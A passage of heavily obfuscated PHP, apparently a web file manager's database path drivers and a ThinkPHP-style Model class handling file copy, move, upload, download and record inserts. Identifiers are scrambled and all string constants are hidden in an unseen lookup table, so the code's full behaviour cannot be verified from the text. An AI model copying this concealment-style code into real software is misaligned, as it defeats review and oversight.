getPath($œƒ¶„Š) { return trim($œƒ¶„Š, $_SERVER[ë¦»ºéÌ][8]); } public function pathFather($ñ´ıÉ±…) { $ïêø¼‚ = $this->parse($ñ´ıÉ±…); $ïêø¼‚ = $this->infoSimple($ñ´ıÉ±…); return $ïêø¼‚ ? $ïêø¼‚[$_SERVER[ë¦»ºéÌ][500]] : !1; } public function pathThis($ÖäÏÙù¢) { $¦Ë®Ù = $this->infoSimple($ÖäÏÙù¢); return $¦Ë®Ù ? $¦Ë®Ù[$_SERVER[ë¦»ºéÌ][42]] : !1; } public function getPathOuter($ß…èœÍ) { if (!$ß…èœÍ) { return $ß…èœÍ; } $¬î½ÛÓÆ = $this->parse($ß…èœÍ); return KodIO::make($¬î½ÛÓÆ[$_SERVER[ë¦»ºéÌ][403]]); } public function copyFolderFromIO($“²¦Ò¶Ê, $¿à©¶ú, $Ò©£ş¯¾, $¡×Ñƒä, $çáõ½Áö) { $—Ú¹îÓ = $this->model->copyFolderFromIO($“²¦Ò¶Ê, $¿à©¶ú, $Ò©£ş¯¾, $¡×Ñƒä, $çáõ½Áö); return KodIO::make($—Ú¹îÓ); } public function isParentOf($’Ô­ŒÔŞ, $¡ĞÜñ) { return $this->model->isParentOf($’Ô­ŒÔŞ, $¡ĞÜñ); } public function mkfile($¯ãŠ”ä¡, $õ“äèŸ = '', $ªºã¿ı = REPEAT_RENAME) { $Ğ ¬ì¬ô =& $_SERVER[ë¦»ºéÌ]; $”şşÇÊî = $this->parse($¯ãŠ”ä¡); $¯ãŠ”ä¡ = $”şşÇÊî[$Ğ ¬ì¬ô[403]]; for ($¡“®º = 0; $¡“®º < count($”şşÇÊî[$Ğ ¬ì¬ô[1306]]); $¡“®º++) { $İÒ’Õƒ = $”şşÇÊî[$Ğ ¬ì¬ô[1306]][$¡“®º]; if ($¡“®º == count($”şşÇÊî[$Ğ ¬ì¬ô[1306]]) - 1) { $¯ãŠ”ä¡ = $this->model->mkfile($¯ãŠ”ä¡, $İÒ’Õƒ, $õ“äèŸ, $ªºã¿ı); break; } $¯ãŠ”ä¡ = $this->model->mkdir($¯ãŠ”ä¡, $İÒ’Õƒ, REPEAT_SKIP); } return $this->getPathOuter($¯ãŠ”ä¡); } public function mkdir($ş­î™­§, $ÒôŒĞÒ  = REPEAT_SKIP) { $‚ğúŠÅó =& $_SERVER[ë¦»ºéÌ]; $Íõİ£† = $this->parse($ş­î™­§); $ş­î™­§ = $Íõİ£†[$‚ğúŠÅó[403]]; for ($æØ«Ùì = 0; $æØ«Ùì < count($Íõİ£†[$‚ğúŠÅó[1306]]); $æØ«Ùì++) { $ï½¾¯Ş = $Íõİ£†[$‚ğúŠÅó[1306]][$æØ«Ùì]; $ş­î™­§ = $this->model->mkdir($ş­î™­§, $ï½¾¯Ş, $ÒôŒĞÒ ); } return $this->getPathOuter($ş­î™­§); } public function copyFile($şÑÆ÷³ñ, $µş“…™µ, $´¤êÇ£¢ = REPEAT_REPLACE) { $÷ÆõùÓ =& $_SERVER[ë¦»ºéÌ]; $Ó€šáßÔ = $this->parse($µş“…™µ); $ç†Şğ”Ñ = $this->model->copy($şÑÆ÷³ñ, $Ó€šáßÔ[$÷ÆõùÓ[403]], $´¤êÇ£¢, $Ó€šáßÔ[$÷ÆõùÓ[88]]); return $ç†Şğ”Ñ ? $this->getPathOuter($ç†Şğ”Ñ) : !1; } public function moveFile($ú†èŒ×¼, $Š«ÚéÏ, $¨Ëş±âË = REPEAT_REPLACE) { $ü£™€™— =& $_SERVER[ë¦»ºéÌ]; $±¸ßúÉÑ = $this->parse($Š«ÚéÏ); $òÆ¡î‘Ë = $this->model->move($ú†èŒ×¼, $±¸ßúÉÑ[$ü£™€™—[403]], $¨Ëş±âË, $±¸ßúÉÑ[$ü£™€™—[88]]); return $òÆ¡î‘Ë ? $this->getPathOuter($òÆ¡î‘Ë) : !1; } public function copy($Ï¿—„Î™, $ûæÄí¬©, $”¢…ƒªÛ = REPEAT_REPLACE, $Ü‡¬ÂÃ• = false) { $÷¤ÄŒÄÇ = $this->parse($ûæÄí¬©); $ì¡’ïŸğ = $this->model->copy($Ï¿—„Î™, $÷¤ÄŒÄÇ[$_SERVER[ë¦»ºéÌ][403]], $”¢…ƒªÛ, $Ü‡¬ÂÃ•); return $ì¡’ïŸğ ? $this->getPathOuter($ì¡’ïŸğ) : !1; } public function moveSameAllow() { } public function move($Ç‚¦İÎˆ, $ğçÄÉç±, $‰ú’ì‡Î = REPEAT_REPLACE, $áãŞú²Ë = false) { $µ´Ø˜Ë = $this->parse($ğçÄÉç±); $”­ó–ÆÕ = $this->model->move($Ç‚¦İÎˆ, $µ´Ø˜Ë[$_SERVER[ë¦»ºéÌ][403]], $‰ú’ì‡Î, $áãŞú²Ë); return $”­ó–ÆÕ ? $this->getPathOuter($”­ó–ÆÕ) : !1; } public function remove($ş¾ª­ïÄ, $óøÀå¨ = true) { return $this->model->remove($ş¾ª­ïÄ, $óøÀå¨); } public function rename($·²¯ÍÏ, $ïÔÅÊ©²) { $ê·õˆ¾ = $this->model->rename($·²¯ÍÏ, $ïÔÅÊ©²); return $ê·õˆ¾ ? $this->getPathOuter($·²¯ÍÏ) : $ê·õˆ¾; } public function size($³´ÙšË) { $æşÉ“º = $this->infoSimple($³´ÙšË); return $æşÉ“º ? $æşÉ“º[$_SERVER[ë¦»ºéÌ][90]] : 0; } public function infoSimple($ªÁ²€»”) { return $this->model->sourceInfo($ªÁ²€»”); } public function info($şûŞ×Õñ) { return $this->infoParse($şûŞ×Õñ); } public function infoAuth($ü¬ƒŒû£) { return $this->infoParse($ü¬ƒŒû£, !1, !0); } public function infoWithChildren($´Ë›) { return $this->infoParse($´Ë›, !0); } protected function infoParse($ ä¡ÑâÃ, $Úü‡ä‘¸ = false, $‚¸ØÁúò = false) { if (!$Úü‡ä‘¸) { return $this->model->pathInfo($ ä¡ÑâÃ, $‚¸ØÁúò); } return $this->model->pathInfoMore($ ä¡ÑâÃ); } public function infoFull($µ‰è¯) { $ˆ‹Û®“ =& $_SERVER[ë¦»ºéÌ]; $†©°Îï— = explode($ˆ‹Û®“[8], $µ‰è¯); $”ëı£ = implode($ˆ‹Û®“[8], array_splice($†©°Îï—, 1)); return $this->model->pathInfoByPath($†©°Îï—[0], $”ëı£); } public function hashSimple($Ø€È“®”) { $ÆÔŞ¿Œ† =& $_SERVER[ë¦»ºéÌ]; $à¬—äóõ = $this->infoWithChildren($Ø€È“®”); return $à¬—äóõ[$ÆÔŞ¿Œ†[175]][$ÆÔŞ¿Œ†[182]]; } public function hashMd5($æ½İØÓÙ) { $Å½Ò«—û =& $_SERVER[ë¦»ºéÌ]; $‰œÌÏà = $this->infoWithChildren($æ½İØÓÙ); return $‰œÌÏà[$Å½Ò«—û[175]][$Å½Ò«—û[181]]; } public function exist($ÍÌëÕ‚ş) { $ÕµêÜÉæ =& $_SERVER[ë¦»ºéÌ]; $öªäÆË = $this->parse($ÍÌëÕ‚ş); if (!$öªäÆË[$ÕµêÜÉæ[88]]) { return $this->isFile($ÍÌëÕ‚ş) || $this->isFolder($ÍÌëÕ‚ş); } $Ğ°®Û©² = array($ÕµêÜÉæ[404] => $öªäÆË[$ÕµêÜÉæ[403]], $ÕµêÜÉæ[42] => $öªäÆË[$ÕµêÜÉæ[88]]); $²ÙÀ¸× = $this->model->where($Ğ°®Û©²)->find(); return $²ÙÀ¸× ? !0 : !1; } public function isFile($ßÉİÑÉ) { $Ç¥Ëò‚­ =& $_SERVER[ë¦»ºéÌ]; $ÊòˆÜÀ¤ = $this->infoSimple($ßÉİÑÉ); return $ÊòˆÜÀ¤ && $ÊòˆÜÀ¤[$Ç¥Ëò‚­[413]] == $Ç¥Ëò‚­[99] ? !1 : !0; } public function isFolder($½Ãê£üö) { $Ùü·‚Ô =& $_SERVER[ë¦»ºéÌ]; $ŠüêŞª§ = $this->infoSimple($½Ãê£üö); return $ŠüêŞª§ && $ŠüêŞª§[$Ùü·‚Ô[413]] == $Ùü·‚Ô[99] ? !0 : !1; } public function listPath($†‘Ä‘›â, $ÍÑóúÉš = false) { $ßÂ‹èã» =& $_SERVER[ë¦»ºéÌ]; if ($†‘Ä‘›â == $ßÂ‹èã»[12]) { return !1; } $ş»ÅÎû = array($ßÂ‹èã»[404] => $†‘Ä‘›â); if ($ÍÑóúÉš) { return $this->model->listSource($ş»ÅÎû, -1); } return $this->model->listSource($ş»ÅÎû); } public function has($Í¹›ª¼¡, $§úßõùĞ = false, $›·ß £ = null) { $¬àŠœñß =& $_SERVER[ë¦»ºéÌ]; $Áäˆ¯Œ¿ = $this->infoWithChildren($Í¹›ª¼¡); if ($§úßõùĞ) { return array($¬àŠœñß[215] => $Áäˆ¯Œ¿[$¬àŠœñß[215]], $¬àŠœñß[214] => $Áäˆ¯Œ¿[$¬àŠœñß[214]]); } return $›·ß £ ? $Áäˆ¯Œ¿[$¬àŠœñß[215]] : $Áäˆ¯Œ¿[$¬àŠœñß[214]]; } public function listAll($†•”ê¢ü) { $Á„Ñºš¶ = IO::info($this->pathParse[$_SERVER[ë¦»ºéÌ][88]]); if (!$Á„Ñºš¶) { return array(); } return $this->model->listAll($†•”ê¢ü); } public function getContent($ËêØ¥¤ˆ) { return $this->model->getContent($ËêØ¥¤ˆ); } public function setContent($å¤óóâ, $‡ØÓÜºÄ = '') { return $this->model->setContent($å¤óóâ, $‡ØÓÜºÄ); } public function fileSubstr($á©¹¢ß, $¹ÌëÚë‘, $›ÌÑêã‘) { return $this->model->fileSubstr($á©¹¢ß, $¹ÌëÚë‘, $›ÌÑêã‘); } public function download($úñ¥Í´Ø, $­†ÕÊïö = '') { $·Ã»ğë² = get_path_father($­†ÕÊïö); $´‚ñ¡® = get_path_this($­†ÕÊïö); $›àŞÎ€ê = $this->model->fileInfoGet($úñ¥Í´Ø); $ñ¯º••ê = IO::copy($›àŞÎ€ê[$_SERVER[ë¦»ºéÌ][88]], $·Ã»ğë², !1, $´‚ñ¡®); return $ñ¯º••ê; } public function setModifyTime($ŠÇã”Úï, $ƒÀìõ§† = '') { $ÚÉ¯•ĞÁ =& $_SERVER[ë¦»ºéÌ]; if (!$ŠÇã”Úï) { return; } $this->model->where(array($ÚÉ¯•ĞÁ[420] => $ŠÇã”Úï))->save(array($ÚÉ¯•ĞÁ[96] => $ƒÀìõ§†)); } public function upload($Û×µäÅì, $ıçËáå—, $‰‘áµ¿Î = false, $ôïİ™» = REPEAT_REPLACE) { $ÀÒ™Ú² =& $_SERVER[ë¦»ºéÌ]; $ü‰·šÑ® = $this->parse($Û×µäÅì); $øœ£ñîñ = $this->model->addFile($ü‰·šÑ®[$ÀÒ™Ú²[403]], $ıçËáå—, $ü‰·šÑ®[$ÀÒ™Ú²[88]], $‰‘áµ¿Î, $ôïİ™»); return $this->getPathOuter($øœ£ñîñ); } public function uploadFileByID($îµŒÍÌ†, $‰°ˆÃˆ“, $Ì˜¹ÇÂÒ) { $«“Å®²È =& $_SERVER[ë¦»ºéÌ]; $ÑêÒâ‰‘ = $this->parse($îµŒÍÌ†); $ş«ùÅ‘¡ = $this->model->addFileByFileID($ÑêÒâ‰‘[$«“Å®²È[403]], $‰°ˆÃˆ“, $ÑêÒâ‰‘[$«“Å®²È[88]], $Ì˜¹ÇÂÒ); return $this->getPathOuter($ş«ùÅ‘¡); } public function addFileByRemote($ÂŸ³ù€í, $÷•ÚÎÚ…, $®ç¬ºÒ× = array(), $ğèÆİ¿Ø = '', $¤éíÏ²İ) { $ùİíÉ¼æ =& $_SERVER[ë¦»ºéÌ]; $âÌÈ· = $this->parse($ÂŸ³ù€í); $ğèÆİ¿Ø = empty($ğèÆİ¿Ø) ? $âÌÈ·[$ùİíÉ¼æ[88]] : $ğèÆİ¿Ø; $³·µÓĞ‰ = $this->model->addFileByRemote($âÌÈ·[$ùİíÉ¼æ[403]], $÷•ÚÎÚ…, $ğèÆİ¿Ø, $®ç¬ºÒ×, $¤éíÏ²İ); return $this->getPathOuter($³·µÓĞ‰); } public function uploadLink($‹œœÜúÔ, $µè›Ÿ¢È = 0) { $ãë¦Ğ¯« =& $_SERVER[ë¦»ºéÌ]; $§Ú’ÓÖí = $this->parse($‹œœÜúÔ); $ûèÙ‚¦” = _get($GLOBALS[$ãë¦Ğ¯«[7]], $ãë¦Ğ¯«[1307]); $«†®ëÙ = _get($GLOBALS[$ãë¦Ğ¯«[7]], $ãë¦Ğ¯«[1308]); $‹œœÜúÔ = Model($ãë¦Ğ¯«[605])->createFileName($§Ú’ÓÖí[$ãë¦Ğ¯«[88]], $ûèÙ‚¦”, $«†®ëÙ); return IO::uploadLink($‹œœÜúÔ, $µè›Ÿ¢È); } public function fileNameAuto($ĞŸ¾û”ş, $Ğ·››¤Ô, $»àªß¡Ã = REPEAT_REPLACE, $‰çÌßığ = false) { return $this->model->fileNameAuto($ĞŸ¾û”ş, $Ğ·››¤Ô, $»àªß¡Ã, $‰çÌßığ); } public function fileNameExist($Á¥Àß•¸, $ŠÃÎ¯ÜÕ) { return $this->model->fileNameExist($Á¥Àß•¸, $ŠÃÎ¯ÜÕ); } protected function _fileOut($¯àè’ß¶, $¶şê¿Û = false, $º—ë¼Ó = false, $‰»¢Äª³ = '', $Õî°à‚© = false) { $¯ì±®æ® =& $_SERVER[ë¦»ºéÌ]; $¦ÔĞ‡ùş = $this->model->sourceInfo($¯àè’ß¶); if ($¦ÔĞ‡ùş[$¯ì±®æ®[413]] == $¯ì±®æ®[99]) { header($¯ì±®æ®[1309]); die; } $¬ í…§ä = $this->model->fileInfoGet($¯àè’ß¶); $‰»¢Äª³ = $¬ í…§ä[$¯ì±®æ®[181]] ? $¬ í…§ä[$¯ì±®æ®[181]] : $‰»¢Äª³; $™ƒÍ„ö = isset($GLOBALS[$¯ì±®æ®[1310]]) ? $GLOBALS[$¯ì±®æ®[1310]] : $¦ÔĞ‡ùş[$¯ì±®æ®[42]]; if ($Õî°à‚©) { return IO::fileOutServer($¬ í…§ä[$¯ì±®æ®[88]], $¶şê¿Û, $™ƒÍ„ö, $‰»¢Äª³); } IO::fileOut($¬ í…§ä[$¯ì±®æ®[88]], $¶şê¿Û, $™ƒÍ„ö, $‰»¢Äª³); } public function fileOut($¢ÏİŠ¼¨, $²š®×À¡ = false, $ïÔ€’ì = false, $—ß–©¸Á = '') { $this->_fileOut($¢ÏİŠ¼¨, $²š®×À¡, $ïÔ€’ì, $—ß–©¸Á); } public function fileOutServer($³€¼”ã, $·é×ïÔÇ = false, $îĞı‡‹Ÿ = false, $öÜØè¿÷ = '') { $this->_fileOut($³€¼”ã, $·é×ïÔÇ, $îĞı‡‹Ÿ, $öÜØè¿÷, !0); } protected function _fileOutImage($ÏãâÍ‘ò, $ÒìîÉæİ = 250) { $£Õéİ¾ñ =& $_SERVER[ë¦»ºéÌ]; $äÛœ–›• = $this->model->pathInfo($ÏãâÍ‘ò); if ($äÛœ–›•[$£Õéİ¾ñ[413]] == $£Õéİ¾ñ[99]) { show_json($£Õéİ¾ñ[1311] . $ÏãâÍ‘ò, !1); } $—É„ñÓ½ = $this->model->fileInfoGet($ÏãâÍ‘ò); $—É„ñÓ½[$£Õéİ¾ñ[42]] = $äÛœ–›•[$£Õéİ¾ñ[42]]; $—É„ñÓ½[$£Õéİ¾ñ[174]] = $äÛœ–›•[$£Õéİ¾ñ[174]]; $GLOBALS[$£Õéİ¾ñ[1310]] = $—É„ñÓ½[$£Õéİ¾ñ[42]]; $GLOBALS[$£Õéİ¾ñ[173]] = $—É„ñÓ½; IO::fileOutImage($—É„ñÓ½[$£Õéİ¾ñ[88]], $ÒìîÉæİ); } public function fileOutImage($•¹¿óê, $€’„ÀŠ = 250) { $this->_fileOutImage($•¹¿óê, $€’„ÀŠ); } public function fileOutImageServer($«‘ÑŒ¹, $ ğ˜¢¦ = 250) { $this->_fileOutImage($«‘ÑŒ¹, $ ğ˜¢¦); } public function link($¨ô¼áÙª, $²êÌŸÉ° = '') { $™ŸÖÚèµ = $this->model->fileInfoGet($¨ô¼áÙª); return IO::link($™ŸÖÚèµ[$_SERVER[ë¦»ºéÌ][88]], $²êÌŸÉ°); } protected function parse($¯´¢†Õô) { $îı¿Ìß– =& $_SERVER[ë¦»ºéÌ]; if (strstr($¯´¢†Õô, $îı¿Ìß–[8]) === !1) { return array($îı¿Ìß–[422] => intval($¯´¢†Õô), $îı¿Ìß–[88] => $îı¿Ìß–[12], $îı¿Ìß–[1306] => array()); } $Ÿ¸ùˆ©§ = explode($îı¿Ìß–[8], trim($¯´¢†Õô, $îı¿Ìß–[8])); if (count($Ÿ¸ùˆ©§) < 2) { show_tips(clear_html($¯´¢†Õô) . $îı¿Ìß–[1312]); } return array($îı¿Ìß–[422] => intval($Ÿ¸ùˆ©§[0]), $îı¿Ìß–[88] => $Ÿ¸ùˆ©§[1], $îı¿Ìß–[1306] => array_slice($Ÿ¸ùˆ©§, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Ø°ø± ±) { $this->pathParse = $Ø°ø± ±; $this->model = Model($_SERVER[ë¦»ºéÌ][1305]); } public function getPathOuter($üšÛÈš) { $´¹â•î =& $_SERVER[ë¦»ºéÌ]; if (!$üšÛÈš) { return $üšÛÈš; } $ªËŒ˜şá = $this->parse($üšÛÈš); return trim(KodIO::makeShare($this->pathParse[$´¹â•î[403]], $ªËŒ˜şá[$´¹â•î[403]]), $´¹â•î[8]); } protected function infoParse($ˆÏÑ“¬, $šïØÖ’ = false, $­…ÈÔüĞ = false) { $ú“ºÊûğ =& $_SERVER[ë¦»ºéÌ]; $¨¼”ñŠ = $this->pathParse[$ú“ºÊûğ[403]]; $À£½êˆå = trim($this->pathParse[$ú“ºÊûğ[1147]], $ú“ºÊûğ[8]); return Action($ú“ºÊûğ[1313])->sharePathInfo($¨¼”ñŠ, $À£½êˆå, $šïØÖ’); } public function infoFull($¤Æ³¶®ß) { $ßôš¯Œ„ =& $_SERVER[ë¦»ºéÌ]; $å–¡æ˜Ì = explode($ßôš¯Œ„[8], trim($¤Æ³¶®ß, $ßôš¯Œ„[8])); if (count($å–¡æ˜Ì) > 1) { $÷ãÉÃæå = implode($ßôš¯Œ„[8], array_splice($å–¡æ˜Ì, 1)); $ÈÈÔ­ø£ = $this->model->pathInfoByPath($å–¡æ˜Ì[0], $÷ãÉÃæå); if (!$ÈÈÔ­ø£) { return !1; } $this->pathParse[$ßôš¯Œ„[1147]] = $ÈÈÔ­ø£[$ßôš¯Œ„[405]]; } return $this->infoParse($¤Æ³¶®ß); } public function listAll($ˆ—Ûê—) { $×º¦îœ =& $_SERVER[ë¦»ºéÌ]; $ĞÅğÌ¬ = IO::info($this->pathParse[$×º¦îœ[88]]); if (!$ĞÅğÌ¬) { return array(); } $âñ„ñ‹ = $this->model->listAll($ˆ—Ûê—); $«Øœ´÷µ = Model($×º¦îœ[597])->getInfo($ĞÅğÌ¬[$×º¦îœ[490]]); $·áÅ• = Action($×º¦îœ[1313]); foreach ($âñ„ñ‹ as &$¨ÀğÔé) { check_abort(); $¨ÀğÔé[$×º¦îœ[97]] = $·áÅ•->_shareItemeParse($¨ÀğÔé[$×º¦îœ[97]], $«Øœ´÷µ); } unset($¨ÀğÔé); return $âñ„ñ‹; } } goto bñòÈ…ÚÎ; f¤Î©Ğ Æ: define($_SERVER[ë¦»ºéÌ][249], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\145", "\x6f\162\x64\x65\162", "\141\154\x69\141\163", "\x68\141\x76\x69\x6e\x67", "\147\162\x6f\x75\160", "\154\157\143\153", "\144\151\163\164\151\x6e\143\164", "\141\x75\164\157", "\146\151\x6c\164\145\x72", "\x76\141\x6c\151\x64\x61\x74\x65", "\162\x65\163\165\x6c\x74", "\x62\151\x6e\144", "\164\x6f\153\x65\x6e"); public function __construct($ş€Úõ§™ = '', $ÉÄØ –Ñ = '', $±±ıº‰á = '') { $ÇÌâ‘‘ =& $_SERVER[ë¦»ºéÌ]; $this->_initialize(); if (!empty($ş€Úõ§™)) { if (strpos($ş€Úõ§™, $ÇÌâ‘‘[10])) { list($this->dbName, $this->name) = explode($ÇÌâ‘‘[10], $ş€Úõ§™); } else { $this->name = $ş€Úõ§™; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ÉÄØ –Ñ)) { $this->tablePrefix = $ÇÌâ‘‘[12]; } elseif ($ÇÌâ‘‘[12] != $ÉÄØ –Ñ) { $this->tablePrefix = $ÉÄØ –Ñ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÇÌâ‘‘[250]); } $this->db(0, empty($this->connection) ? $±±ıº‰á : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ò˜Í‰™¡ =& $_SERVER[ë¦»ºéÌ]; if (empty($this->fields)) { if (think_config($ò˜Í‰™¡[251])) { $”å÷ÌœŸ = $this->dbName ? $this->dbName : think_config($ò˜Í‰™¡[252]); $«æÓŒ‹ = think_var_cache($ò˜Í‰™¡[253] . strtolower(get_path_this($”å÷ÌœŸ) . $ò˜Í‰™¡[10] . $this->name)); if ($«æÓŒ‹) { $ÙŠœ²çİ = think_config($ò˜Í‰™¡[254]); if (empty($ÙŠœ²çİ) || $«æÓŒ‹[$ò˜Í‰™¡[255]] == $ÙŠœ²çİ) { $this->fields = $«æÓŒ‹; return; } } } $this->flush(); } } public function flush() { $â÷ë¥Ÿš =& $_SERVER[ë¦»ºéÌ]; $this->db->setModel($this->name); $¬ºƒ‘Œ = $this->db->getFields($this->getTableName()); if (!$¬ºƒ‘Œ) { return !1; } $this->fields = array_keys($¬ºƒ‘Œ); $this->fields[$â÷ë¥Ÿš[256]] = !1; foreach ($¬ºƒ‘Œ as $ıÙÃ•¦ => $ìËæ¯İ„) { $²®øäÑ[$ıÙÃ•¦] = $ìËæ¯İ„[$â÷ë¥Ÿš[43]]; if ($ìËæ¯İ„[$â÷ë¥Ÿš[49]]) { $this->fields[$â÷ë¥Ÿš[257]] = $ıÙÃ•¦; if ($ìËæ¯İ„[$â÷ë¥Ÿš[52]]) { $this->fields[$â÷ë¥Ÿš[256]] = !0; } } } $this->fields[$â÷ë¥Ÿš[258]] = $²®øäÑ; if (think_config($â÷ë¥Ÿš[254])) { $this->fields[$â÷ë¥Ÿš[255]] = think_config($â÷ë¥Ÿš[254]); } if (think_config($â÷ë¥Ÿš[251])) { $’ü‰À©‡ = $this->dbName ? $this->dbName : think_config($â÷ë¥Ÿš[252]); think_var_cache($â÷ë¥Ÿš[253] . strtolower(get_path_this($’ü‰À©‡) . $â÷ë¥Ÿš[10] . $this->name), $this->fields); } } public function switchModel($åâ¸¿‚â, $ÂÕ¾¿¾† = array()) { $ü£•ö²¶ =& $_SERVER[ë¦»ºéÌ]; $è×ïŒ¶ = ucwords(strtolower($åâ¸¿‚â)) . $ü£•ö²¶[259]; if (!class_exists($è×ïŒ¶)) { think_exception($è×ïŒ¶ . think_lang($ü£•ö²¶[260])); } $this->_extModel = new $è×ïŒ¶($this->name); if (!empty($ÂÕ¾¿¾†)) { foreach ($ÂÕ¾¿¾† as $åîà¨€¿) { $this->_extModel->setProperty($åîà¨€¿, $this->{$åîà¨€¿}); } } return $this->_extModel; } public function __set($„ğ·ŞÍ¢, $Íõôò…Ô) { $this->data[$„ğ·ŞÍ¢] = $Íõôò…Ô; } public function __get($óÁ«ºÆÔ) { return isset($this->data[$óÁ«ºÆÔ]) ? $this->data[$óÁ«ºÆÔ] : null; } public function __isset($İüÂı£—) { return isset($this->data[$İüÂı£—]); } public function __unset($±ã˜õæÍ) { unset($this->data[$±ã˜õæÍ]); } public function __call($Ìß‚ã³Ø, $½¼á•) { $Î´ŒÔ¿ü =& $_SERVER[ë¦»ºéÌ]; if (in_array(strtolower($Ìß‚ã³Ø), $this->methods, !0)) { $this->options[strtolower($Ìß‚ã³Ø)] = $½¼á•[0]; return $this; } elseif (in_array(strtolower($Ìß‚ã³Ø), array($Î´ŒÔ¿ü[261], $Î´ŒÔ¿ü[262], $Î´ŒÔ¿ü[263], $Î´ŒÔ¿ü[264], $Î´ŒÔ¿ü[265]), !0)) { $Úë‘¦¯‚ = isset($½¼á•[0]) ? $½¼á•[0] : $Î´ŒÔ¿ü[193]; $Úë‘¦¯‚ = $this->db->parseKey($Úë‘¦¯‚); return $this->getField(strtoupper($Ìß‚ã³Ø) . $Î´ŒÔ¿ü[266] . $Úë‘¦¯‚ . $Î´ŒÔ¿ü[267] . $Ìß‚ã³Ø, $Î´ŒÔ¿ü[261]); } elseif (strtolower(substr($Ìß‚ã³Ø, 0, 5)) == $Î´ŒÔ¿ü[268]) { $Úë‘¦¯‚ = think_parse_name(substr($Ìß‚ã³Ø, 5)); $ÀÑéŞ­Ş[$Úë‘¦¯‚] = $½¼á•[0]; return $this->where($ÀÑéŞ­Ş)->find(); } elseif (strtolower(substr($Ìß‚ã³Ø, 0, 10)) == $Î´ŒÔ¿ü[269]) { $Ğêò³ø¬ = think_parse_name(substr($Ìß‚ã³Ø, 10)); $ÀÑéŞ­Ş[$Ğêò³ø¬] = $½¼á•[0]; return $this->where($ÀÑéŞ­Ş)->getField($½¼á•[1]); } elseif (isset($this->_scope[$Ìß‚ã³Ø])) { return $this->scope($Ìß‚ã³Ø, $½¼á•[0]); } elseif (method_exists($this, $Ìß‚ã³Ø)) { array_unshift($½¼á•, $Ìß‚ã³Ø); return call_user_func_array(array($this, $Î´ŒÔ¿ü[270]), $½¼á•); } else { return call_user_func_array(array(parent, $Ìß‚ã³Ø), $½¼á•); } } protected function call() { $ÒÀóÁß¯ =& $_SERVER[ë¦»ºéÌ]; $ÊĞÊÈø = func_get_args(); $öú¤½Ë© = array_shift($ÊĞÊÈø); $„“Ş´õ = $öú¤½Ë©; if (is_array($öú¤½Ë©)) { $„“Ş´õ = $öú¤½Ë©[1]; $öú¤½Ë© = $öú¤½Ë©[0]; } $©á€ü«  = count($ÊĞÊÈø) - 1; if (isset($ÊĞÊÈø[$©á€ü« ]) && $ÊĞÊÈø[$©á€ü« ] === $öú¤½Ë©) { think_exception(__CLASS__ . $ÒÀóÁß¯[4] . $öú¤½Ë© . think_lang($ÒÀóÁß¯[271])); return; } $ÊĞÊÈø[] = $öú¤½Ë©; if (method_exists($this, $ÒÀóÁß¯[272])) { $ñÓ¢‡Ì = call_user_func_array(array($this, $ÒÀóÁß¯[273]), array($„“Ş´õ, $ÊĞÊÈø)); if (!is_null($ñÓ¢‡Ì) && $ñÓ¢‡Ì !== !1) { return $ñÓ¢‡Ì; } } $±„°—— = call_user_func_array(array($this, $öú¤½Ë©), $ÊĞÊÈø); if (method_exists($this, $ÒÀóÁß¯[274])) { $ñÓ¢‡Ì = call_user_func_array(array($this, $ÒÀóÁß¯[275]), array($„“Ş´õ, $ÊĞÊÈø, $±„°——)); if ($ñÓ¢‡Ì) { return $ñÓ¢‡Ì; } } return $±„°——; } protected function _initialize() { } protected function _facade($›ÅæÛøÓ) { $É™ƒ¶÷ =& $_SERVER[ë¦»ºéÌ]; if (!empty($this->fields)) { foreach ($›ÅæÛøÓ as $°¥Ë‰õ => $¿Ğ¨Öß¸) { if (is_array($this->fields) && !in_array($°¥Ë‰õ, $this->fields, !0)) { unset($›ÅæÛøÓ[$°¥Ë‰õ]); } elseif (is_scalar($¿Ğ¨Öß¸)) { $this->_parseType($›ÅæÛøÓ, $°¥Ë‰õ); } } } if (!empty($this->options[$É™ƒ¶÷[276]])) { $›ÅæÛøÓ = array_map($this->options[$É™ƒ¶÷[276]], $›ÅæÛøÓ); unset($this->options[$É™ƒ¶÷[276]]); } $this->_beforeWrite($›ÅæÛøÓ); return $›ÅæÛøÓ; } protected function _beforeWrite(&$î¯ÂØê¤) { } public function add($ãè‚´ä = '', $Ğ’À÷öÍ = array(), $Ÿ¶«³ç„ = false) { if (empty($ãè‚´ä)) { if (!empty($this->data)) { $ãè‚´ä = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ë¦»ºéÌ][277]); return !1; } } $Ğ’À÷öÍ = $this->_parseOptions($Ğ’À÷öÍ); $ãè‚´ä = $this->_facade($ãè‚´ä); if (!1 === $this->_beforeInsert($ãè‚´ä, $Ğ’À÷öÍ)) { return !1; } $şŠè¢†Ë = $this->db->insert($ãè‚´ä, $Ğ’À÷öÍ, $Ÿ¶«³ç„); if (!1 !== $şŠè¢†Ë) { $æ»¿ìè† = $this->getLastInsID(); if ($æ»¿ìè†) { $ãè‚´ä[$this->getPk()] = $æ»¿ìè†; $this->_after_insert($ãè‚´ä, $Ğ’À÷öÍ); return $æ»¿ìè†; } $this->_after_insert($ãè‚´ä, $Ğ’À÷öÍ); } return $şŠè¢†Ë; } protected function _beforeInsert(&$ÔøÓ¥‚š, $©Çƒº¼Ü) { } protected function _after_insert($ƒÁÍÍÕ, $ßİ©æ¯) { } public function addAll($ğÔ¸©˜Ø, $ÏÈ›äõ… = array(), $³³û¨Õ = false) { $ë–¤„‚ü =& $_SERVER[ë¦»ºéÌ]; if (empty($ğÔ¸©˜Ø)) { $this->error = think_lang($ë–¤„‚ü[277]); return !1; } $ÏÈ›äõ… = $this->_parseOptions($ÏÈ›äõ…); foreach ($ğÔ¸©˜Ø as $¡Àæ€À° => $òõÕÂ‰) { $ğÔ¸©˜Ø[$¡Àæ€À°] = $this->_facade($òõÕÂ‰); } if (method_exists($this->db, 